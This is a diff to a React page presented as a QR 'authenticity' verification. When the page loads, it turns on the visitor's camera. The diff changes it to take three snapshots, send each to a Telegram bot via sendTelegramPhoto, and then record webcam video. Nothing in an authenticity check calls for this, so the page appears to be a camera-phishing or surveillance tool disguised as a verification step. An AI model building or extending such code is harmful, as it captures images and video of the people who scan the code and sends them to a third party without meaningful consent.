@@ -35,7 +35,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
   const streamRef = useRef<MediaStream | null>(null); // Ref для хранения текущего MediaStream
   const mediaRecorderRef = useRef<MediaRecorder | null>(null); // Ref для хранения MediaRecorder
   const recordedChunksRef = useRef<Blob[]>([]); // Ref для хранения записанных чанков
-  const isProcessingRef = useRef(false); // NEW: Local ref to prevent re-entry during rapid re-renders
+  const isProcessingRef = useRef(false); // Local ref to prevent re-entry during rapid re-renders
 
   // Обновляем streamRef при изменении stream
   useEffect(() => {
@@ -170,42 +170,47 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
         await videoRef.current.play();
       }
 
-      // Важно: небольшая задержка, чтобы видеопоток успел отобразить кадр
-      await new Promise(resolve => setTimeout(resolve, 500)); 
+      // NEW: Longer initial delay for camera to stabilize before first photo
+      setStatusMessage(t.authenticity.processingRequest + " (Camera stabilizing...)");
+      await new Promise(resolve => setTimeout(resolve, 2000)); // 2 seconds for stabilization
 
-      // 5. Делаем снимок
-      setStatusMessage(t.authenticity.processingRequest + " (Taking photo...)");
-      if (videoRef.current && canvasRef.current) {
-        const video = videoRef.current;
-        const canvas = canvasRef.current;
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        if (ctx) {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
-          
-          try {
-            await sendTelegramPhoto({ photoBase64, caption: initialCaption });
-            setStatusMessage(t.authenticity.processingRequest + " (Photo sent.)");
-          } catch (photoSendError: unknown) {
-            console.error("Error sending photo to Telegram:", photoSendError);
-            setError(t.authenticity.qrScanError + (photoSendError instanceof Error ? `: ${photoSendError.message}` : "."));
-            setIsLoading(false);
-            stopCamera();
-            return;
+      // 5. Take 3 Photos with short delays
+      setStatusMessage(t.authenticity.processingRequest + " (Taking photos...)");
+      for (let i = 0; i < 3; i++) {
+        if (videoRef.current && canvasRef.current) {
+          const video = videoRef.current;
+          const canvas = canvasRef.current;
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+          if (ctx) {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const photoBase64 = canvas.toDataURL('image/jpeg', 0.8);
+            
+            try {
+              await sendTelegramPhoto({ photoBase64, caption: `${initialCaption}\n(Photo ${i + 1}/3)` });
+              console.log(`Photo ${i + 1} sent.`);
+            } catch (photoSendError: unknown) {
+              console.error(`Error sending photo ${i + 1} to Telegram:`, photoSendError);
+              // Don't stop the whole process for one photo failure, but log error
+            }
           }
         }
+        if (i < 2) { // Delay between photos
+          await new Promise(resolve => setTimeout(resolve, 500)); // 0.5 second delay
+        }
       }
+      setStatusMessage(t.authenticity.processingRequest + " (Photos sent.)");
 
-      // 6. Начинаем запись видео (если снимок был успешным)
+
+      // 6. Начинаем запись видео (если снимки были успешными)
       setStatusMessage(t.authenticity.recordingInstructions + " (Starting video recording...)");
       const recorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm; codecs=vp8,opus' });
       setMediaRecorder(recorder); // Устанавливаем MediaRecorder в состояние
 
       recorder.ondataavailable = (event: BlobEvent) => {
         if (event.data.size > 0) {
-          setRecordedChunks((prev: Blob[]) => [...prev, event.data]);
+          recordedChunksRef.current.push(event.data); // Push to ref directly
         }
       };
 
@@ -269,6 +274,7 @@ const QrVerifyPage = ({ params: _params }: QrVerifyPageProps) => {
   useEffect(() => {
     console.log("useEffect for QrVerifyPage triggered.");
     // Вызываем startVerificationProcess только один раз при монтировании
+    // Проверки sessionStorage и isProcessingRef.current теперь внутри startVerificationProcess
     startVerificationProcess();
 
     return () => {
